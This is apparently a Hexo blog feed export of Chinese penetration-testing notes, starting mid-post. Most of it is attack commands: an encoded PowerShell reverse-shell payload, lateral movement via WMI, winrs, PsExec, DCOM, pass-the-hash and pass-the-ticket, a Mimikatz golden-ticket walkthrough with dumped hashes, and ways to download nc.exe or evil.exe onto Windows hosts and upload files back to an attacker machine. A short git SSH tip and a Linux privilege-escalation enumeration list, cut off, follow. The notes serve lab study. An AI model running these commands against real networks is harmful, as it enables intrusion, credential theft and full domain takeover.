.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte .Leng</span></span><br><span class="line"><span class="string">th);$stream .Flush()&#125;;$client .Close()&#x27;</span></span><br><span class="line">cmd = <span class="string">&quot;powershell -nop -w hidden -e &quot;</span> +</span><br><span class="line">base64.b64encode(payload.encode(<span class="string">&#x27;utf16&#x27;</span>)[<span class="number">2</span>:]).decode()</span><br><span class="line"><span class="built_in">print</span>(cmd)</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$username</span> = <span class="string">&#x27;jen&#x27;</span>;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$password</span> = <span class="string">&#x27;Nexus123!&#x27;</span>;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$secureString</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlaintext</span> - Force;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$secureString</span>;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$Options</span> = <span class="built_in">New-CimSessionOption</span> <span class="literal">-Protocol</span> DCOM</span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$Session</span> = <span class="built_in">New-Cimsession</span> <span class="literal">-ComputerName</span> <span class="number">192.168</span>.<span class="number">50.73</span> <span class="literal">-Credential</span> <span class="variable">$credential</span> <span class="literal">-SessionOption</span> <span class="variable">$Options</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$Command</span> = <span class="string">&#x27;powershell -nop -w hidden -e</span></span><br><span class="line"><span class="string">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...</span></span><br><span class="line"><span class="string">HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#x27;</span>;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="built_in">Invoke-CimMethod</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-ClassName</span> Win32_Process - MethodName Create <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;CommandLine =<span class="variable">$Command</span>&#125;;</span><br></pre></td></tr></table></figure><p>使用winrs命令也可以(前提是域用户需要成为目标主机上的管理员或远程管理用户组的一部分。)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:files04 -u:jen -p:Nexus123! &quot;cmd /c hostname &amp; whoami&quot;</span><br></pre></td></tr></table></figure><h3 id="使用PsExec进行横向移动"><a href="#使用PsExec进行横向移动" class="headerlink" title="使用PsExec进行横向移动"></a>使用PsExec进行横向移动</h3><p>使用PsExec进行横向移动的前提是，首先，向目标计算机进行身份验证的用户需要属于管理员本地组（Administrators local group）。此外，ADMIN$ 共享必须可用，并且必须打开文件和打印机共享。最后两个要求默认已经得到满足，因为它们是现代 Windows Server 系统上的默认设置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd</span><br></pre></td></tr></table></figure><h3 id="Pass-the-hash"><a href="#Pass-the-hash" class="headerlink" title="Pass the hash"></a>Pass the hash</h3><p>允许攻击者使用用户的 NTLM 哈希而不是明文密码对远程系统或服务进行身份验证。这不适用于 Kerberos 身份验证，而仅适用于使用 NTLM 身份验证的服务器或服务。</p><p>与 PsExec 类似，此技术需要通过防火墙建立 SMB 连接（通常为端口 445）并启用 Windows 文件和打印机共享功能。</p><p>这种横向移动技术还需要名为 ADMIN$ 的管理共享可用。为了与此共享建立连接，攻击者必须使用本地管理员权限的凭据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># kali执行</span><br><span class="line">/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73</span><br></pre></td></tr></table></figure><h3 id="Over-pass-the-hash"><a href="#Over-pass-the-hash" class="headerlink" title="Over pass the hash"></a>Over pass the hash</h3><p>Over pass the hash横向移动技术的本质是将 NTLM 哈希转换为 Kerberos 票证并避免使用 NTLM 身份验证。一个简单的方法是使用 Mimikatz 中的 sekurlsa::pth 命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell</span><br></pre></td></tr></table></figure><p>然后拿到一个新的powershell，在新的powershell中运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 必须运行net use，不然不会生成Kerberos TGT</span><br><span class="line">net use \\files04</span><br><span class="line"># 验证TGT是否成功生成</span><br><span class="line">klist</span><br></pre></td></tr></table></figure><p>现在，已将 NTLM 哈希转换为 Kerberos TGT，从而允许使用任何依赖 Kerberos 身份验证（而不是 NTLM）的工具，例如PsExec</p><p>PsExec 可以远程运行命令，但不接受密码哈希。由于已经生成了 Kerberos 票证并在 新的PowerShell 会话中以 jen 运行，因此可以重用 TGT 来在 files04 主机上获取代码执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\PsExec.exe \\files04 cmd</span><br></pre></td></tr></table></figure><h3 id="Pass-the-Ticket"><a href="#Pass-the-Ticket" class="headerlink" title="Pass the Ticket"></a>Pass the Ticket</h3><p>over pass the hash技术是用来来获取 Kerberos TGT，从而允许使用 Kerberos 进行身份验证。我们只能在为其创建的机器上使用 TGT，但 TGS 可能提供更大的灵活性。</p><p>pass the ticket攻击利用了 TGS，它可以导出并重新注入到网络上的其他地方，然后用于对特定服务进行身份验证。此外，如果服务票证属于当前用户，则不需要管理权限。</p><p>例如这里目标是利用 dave 的凭据。dave 用户有权访问位于 WEB04 上的备份文件夹，而当前用户 jen 没有。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /export</span><br><span class="line"></span><br><span class="line"># 返回生成的票据，选择 dave@cifs-web04.kirbi 格式的凭据</span><br><span class="line">dir *.kirbi</span><br><span class="line"># [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi是在上面命令中返回的name</span><br><span class="line">kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi</span><br><span class="line"># powershell中检查是否成功</span><br><span class="line">klist</span><br><span class="line"># 访问web04的backup文件夹成功</span><br><span class="line">ls \\web04\backup</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用DCOM进行横向移动"><a href="#使用DCOM进行横向移动" class="headerlink" title="使用DCOM进行横向移动"></a>使用DCOM进行横向移动</h3><p>与 DCOM 的交互是通过 TCP 端口 135 上的 RPC 执行的，并且需要本地管理员访问权限才能调用 DCOM 服务控制管理器，这本质上是一个 API。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 只改IP</span><br><span class="line">$dcom =[System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application .1&quot;,&quot;192.168.50.73&quot;))</span><br><span class="line"># 只关注第一个和第三个参数，这里是cmd 和 /c calc</span><br><span class="line">$dcom.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)</span><br><span class="line"># 同样也可以反弹shell</span><br><span class="line">$dcom .Document .ActiveView .ExecuteShellCommand(&quot;powershell&quot;,$null,&quot;powershell -nop -w hidden -e base64shell&quot;,&quot;7&quot;)</span><br></pre></td></tr></table></figure><h2 id="内网持久化控制"><a href="#内网持久化控制" class="headerlink" title="内网持久化控制"></a>内网持久化控制</h2><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>前提是能够获得 krbtgt 的域用户帐户的密码哈希，则可以创建自己的自定义 TGT，也称为黄金票据，黄金票证授予我们访问整个域资源的权限。</p><p>这里假设是jen用户在client74机器上尝试移动到dc上，目标是通过远程桌面登录域控制器。</p><p>其实，创建黄金票证并将其注入内存不需要任何管理权限，甚至可以从未加入域的计算机上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line"># 获得 krbtgt 帐户的 NTLM 哈希以及域 SID</span><br><span class="line">lsadump::lsa /patch</span><br><span class="line">Domain : CORP / S-1-5-21-1987370270-658905905-1781884369</span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">LM    :</span><br><span class="line">NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e</span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line">LM    :</span><br><span class="line">NTLM :</span><br><span class="line">RID  : 000001f6 (502)</span><br><span class="line">User : krbtgt</span><br><span class="line">LM    :</span><br><span class="line">NTLM : 1693c6cefafffc7af11ef34d1c788f47</span><br><span class="line"></span><br><span class="line"># 删除任何现有的 Kerberos 票据</span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line"># 需要提供一个现有帐户，这里是jen</span><br><span class="line">kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt</span><br><span class="line"></span><br><span class="line">misc::cmd</span><br><span class="line"></span><br><span class="line"># 然后在新的cmd中运行</span><br><span class="line"># 如果这里将 PsExec 连接到域控制器的 IP 地址而不是主机名，将强制使用 NTLM 身份验证，并且访问失败</span><br><span class="line">PsExec.exe \\dc1 cmd.exe</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File Tranfer</title>
      <link href="/2024/06/05/File-Tranfer/"/>
      <url>/2024/06/05/File-Tranfer/</url>
      
        <content type="html"><![CDATA[<h2 id="非交互式shell的升级"><a href="#非交互式shell的升级" class="headerlink" title="非交互式shell的升级"></a>非交互式shell的升级</h2><p>最新版kali使用的是zsh不是bash，所以之前的应该使用如下方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#in kali</span><br><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">然后ctrl+Z将进程放置到后台运行</span><br><span class="line">stty raw -echo; fg</span><br><span class="line">enter</span><br><span class="line">export SHELL=/bin/bash</span><br><span class="line">export TERM=screen</span><br><span class="line">stty rows 40 columns 120</span><br><span class="line">reset</span><br></pre></td></tr></table></figure><h2 id="Linux系统文件传输"><a href="#Linux系统文件传输" class="headerlink" title="Linux系统文件传输"></a>Linux系统文件传输</h2><p>nc、wget、curl等，相对容易</p><h2 id="win系统传文件"><a href="#win系统传文件" class="headerlink" title="win系统传文件"></a>win系统传文件</h2><h3 id="使用原生FTP命令进行下载"><a href="#使用原生FTP命令进行下载" class="headerlink" title="使用原生FTP命令进行下载"></a>使用原生FTP命令进行下载</h3><p>Windows系统默认包含FTP客户端程序(交互式程序)，-s参数可指定包含FTP指令的源文件实现非交互式传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\offsec&gt;echo open 10.11.0.4 21&gt;ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo USER offsec&gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo lab&gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo bin&gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo GET nc.exe &gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo bye &gt;&gt; ftp.txt</span><br></pre></td></tr></table></figure><p>利用以上指定源文件下载nc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\offsec&gt; ftp -v -n -s:ftp.txt</span><br></pre></td></tr></table></figure><h3 id="使用脚本下载文件"><a href="#使用脚本下载文件" class="headerlink" title="使用脚本下载文件"></a>使用脚本下载文件</h3><p>Windows XP、2003等系统可以使用VBScript脚本下载文件</p><p>Win 7、2008以上系统可使用Powershell传输文件;</p><p>VBScript脚本(wget.vbs)</p><p>运行脚本下载攻击程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; cscript wget.vbs http://10.11.0.4/evil.exe evil.exe</span><br></pre></td></tr></table></figure><p>Powershell脚本</p><p>Powershell默认策略、配置有限制，因此需要增加绕过限制的参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</span><br><span class="line"></span><br><span class="line">-ExecutionPolicy Bypass #绕过默认执行策略</span><br><span class="line">-NoLogo、-NonInteractive #隐藏powershell logo、banner、交互提示信息</span><br><span class="line">-NoProfile #禁用默认配置文件</span><br></pre></td></tr></table></figure><p>win10上自带curl可以直接下载,powshell里有wget</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://xxx -o shell.exe</span><br></pre></td></tr></table></figure><p>Powershell命令下载文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt;powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#x27;http://10.11.0.4/evil.exe&#x27;,&#x27;new-exploit.exe&#x27;)</span><br></pre></td></tr></table></figure><p>利用certutil</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f &quot;https://xxx&quot; pstools.zip</span><br></pre></td></tr></table></figure><p>利用rdesktop，远程桌面连接同时挂载共享文件夹（kali攻击机）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -u &lt;user&gt; IP地址 -p &lt;pass&gt; -g 1200x900 -x -x80 -r sound:local -r disk:LinuxPictures=/home/user/Pictures</span><br></pre></td></tr></table></figure><p>如果rdesktop不好使，就用xfreerdp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:yfh /p:vv /v:172.16.8.137 /w:1200 /h:900 /drive:home,/home/kali/Downloads</span><br></pre></td></tr></table></figure><h2 id="从目标主机上下载文件"><a href="#从目标主机上下载文件" class="headerlink" title="从目标主机上下载文件"></a>从目标主机上下载文件</h2><p>kali上开文件共享，impacket-smbserver </p><p>或kali上开一个接收上传文件的php页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="string">&#x27;/var/www/uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$uploadfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在Kali 上创建接收端脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload.php</span><br></pre></td></tr></table></figure><p>创建目录接收文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /varlwww/uploads</span><br><span class="line">sudo chown www-data:/var/www/uploads</span><br></pre></td></tr></table></figure><p>从 Windows主机上传文件到Kali </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; powershell (New-Object</span><br><span class="line">System.Net.WebClient).uploadFile(&#x27;http://kali/upload.php&#x27;, &#x27;nc.exe&#x27;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git命令github报错22端口拒绝访问的解决方法</title>
      <link href="/2024/06/05/git%E5%91%BD%E4%BB%A4github%E6%8A%A5%E9%94%9922%E7%AB%AF%E5%8F%A3%E6%8B%92%E7%BB%9D%E8%AE%BF%E9%97%AE%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2024/06/05/git%E5%91%BD%E4%BB%A4github%E6%8A%A5%E9%94%9922%E7%AB%AF%E5%8F%A3%E6%8B%92%E7%BB%9D%E8%AE%BF%E9%97%AE%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>连接测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh: connect to host github.com port 22: Connection timed out</span><br><span class="line">or</span><br><span class="line">ssh: connect to host github.com port 22: Connection refused</span><br></pre></td></tr></table></figure><p>这种可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T -p 443 git@ssh.github.com</span><br></pre></td></tr></table></figure><p>修改~&#x2F;.ssh&#x2F;config文件，如果没有就创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  Hostname ssh.github.com</span><br><span class="line">  Port 443</span><br></pre></td></tr></table></figure><p>然后再测试连接</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Privilege Escalation</title>
      <link href="/2024/06/05/Linux-Privilege-Escalation/"/>
      <url>/2024/06/05/Linux-Privilege-Escalation/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Linux版本</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/lsb-release      # Debian based</span><br><span class="line">cat /etc/redhat-release   # Redhat based</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">内核版本</span></span><br><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">环境变量信息</span></span><br><span class="line">cat /etc/profile</span><br><span class="line">cat /etc/bashrc</span><br><span class="line">cat ~/.bash_profile</span><br><span class="line">cat ~/.bashrc</span><br><span class="line">cat ~/.bash_logout</span><br><span class="line">env</span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">是否有打印机</span></span><br><span class="line">lpstat -a</span><br></pre></td></tr></table></figure><h3 id="应用程序和服务信息收集"><a href="#应用程序和服务信息收集" class="headerlink" title="应用程序和服务信息收集"></a>应用程序和服务信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">运行了什么服务，什么服务有哪个用户的权限</span></span><br><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">cat /etc/services</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">哪些服务正在由 root 运行？</span></span><br><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装了哪些应用程序？它们是什么版本？哪些目前正在运行？</span></span><br><span class="line">ls -alh /usr/bin/</span><br><span class="line">ls -alh /sbin/</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh /var/cache/apt/archivesO</span><br><span class="line">ls -alh /var/cache/yum/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">是否有任何服务设置配置错误？是否附加了任何脆弱的插件？</span></span><br><span class="line">cat /etc/syslog.conf</span><br><span class="line">cat /etc/chttp.conf</span><br><span class="line">cat /etc/lighttpd.conf</span><br><span class="line">cat /etc/cups/cupsd.conf</span><br><span class="line">cat /etc/inetd.conf</span><br><span class="line">cat /etc/apache2/apache2.conf</span><br><span class="line">cat /etc/my.conf</span><br><span class="line">cat /etc/httpd/conf/httpd.conf</span><br><span class="line">cat /opt/lampp/etc/httpd.conf</span><br><span class="line">ls -aRl /etc/ | awk &#x27;$1 ~ /^.*r.*/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">有哪些计划任务？</span></span><br><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">是否有明文凭据信息？</span></span><br><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla</span><br></pre></td></tr></table></figure><h3 id="网络信息收集"><a href="#网络信息收集" class="headerlink" title="网络信息收集"></a>网络信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">系统有哪些网卡？网卡连接到哪些网络？</span></span><br><span class="line">/sbin/ifconfig -a</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网络配置设置信息（DHCP服务器、DNS服务器、网关）</span></span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/networks</span><br><span class="line">iptables -L</span><br><span class="line">hostname</span><br><span class="line">dnsdomainname</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">有无其他主机和当前主机有连接</span></span><br><span class="line">lsof -i</span><br><span class="line">lsof -i :80</span><br><span class="line">grep 80 /etc/services</span><br><span class="line">netstat -antup</span><br><span class="line">netstat -antpx</span><br><span class="line">netstat -tulpn</span><br><span class="line">chkconfig --list</span><br><span class="line">chkconfig --list | grep 3:on</span><br><span class="line">last</span><br><span class="line">w</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查路由和arp表</span></span><br><span class="line">arp -e</span><br><span class="line">route</span><br><span class="line">/sbin/route -nee</span><br></pre></td></tr></table></figure><h3 id="凭据和用户信息收集"><a href="#凭据和用户信息收集" class="headerlink" title="凭据和用户信息收集"></a>凭据和用户信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 